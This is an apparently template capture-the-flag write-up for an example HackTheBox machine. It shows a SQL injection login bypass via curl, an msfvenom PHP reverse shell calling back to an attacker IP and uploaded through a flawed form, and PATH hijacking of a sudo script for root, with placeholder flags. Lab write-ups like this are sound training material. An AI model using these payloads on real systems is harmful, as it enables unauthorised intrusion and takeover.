# Example Machine

## Information

- **Difficulty**: Easy
- **Category**: Machine
- **Platform**: HackTheBox
- **Date**: 2025-01-15
- **Points**: 20

## Challenge Description

This is an example writeup to demonstrate the structure and format that should be used for machine writeups in this repository. Replace this with the actual description of the machine.

## Reconnaissance

### Initial Scan

```bash
# Nmap scan
nmap -sC -sV -oN nmap_initial.txt 10.10.10.1

# Results show:
# PORT   STATE SERVICE VERSION
# 22/tcp open  ssh     OpenSSH 7.6p1
# 80/tcp open  http    Apache httpd 2.4.29
```

### Findings

- SSH service running on port 22 (OpenSSH 7.6p1)
- HTTP service running on port 80 (Apache 2.4.29)
- Web application appears to be a custom CMS

## Exploitation

### Vulnerability Analysis

After enumerating the web application, we discovered:
- SQL injection vulnerability in the login form
- Directory traversal in the file upload functionality

### Exploit Development

```bash
# SQL injection to bypass authentication
curl -X POST http://10.10.10.1/login \
  -d "username=admin' OR '1'='1&password=anything"

# After getting access, upload a reverse shell
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw > shell.php

# Upload the shell via the vulnerable upload feature
curl -X POST http://10.10.10.1/upload \
  -F "file=@shell.php"
```

### User Flag

```
User flag location: /home/user/user.txt
Flag: HTB{example_user_flag_here}
```

## Privilege Escalation

### Enumeration

```bash
# Check for SUID binaries
find / -perm -4000 2>/dev/null

# Check sudo privileges
sudo -l

# Found: User can run /usr/bin/custom_script as root without password
```

### Exploitation

The custom script had a vulnerability that allowed path hijacking:

```bash
# Create a malicious script
echo '#!/bin/bash' > /tmp/ls
echo '/bin/bash' >> /tmp/ls
chmod +x /tmp/ls

# Modify PATH
export PATH=/tmp:$PATH

# Run the vulnerable script
sudo /usr/bin/custom_script
```

### Root Flag

```
Root flag location: /root/root.txt
Flag: HTB{example_root_flag_here}
```

## Lessons Learned

- Always check for SQL injection vulnerabilities in login forms
- File upload functionality should validate file types and content
- SUID binaries and sudo privileges require careful configuration
- Path hijacking can lead to privilege escalation when scripts don't use absolute paths

## Tools Used

- Nmap - Network reconnaissance
- Burp Suite - Web application testing
- SQLMap - SQL injection exploitation
- Metasploit Framework (msfvenom) - Payload generation
- LinPEAS - Linux privilege escalation enumeration

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [GTFOBins](https://gtfobins.github.io/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
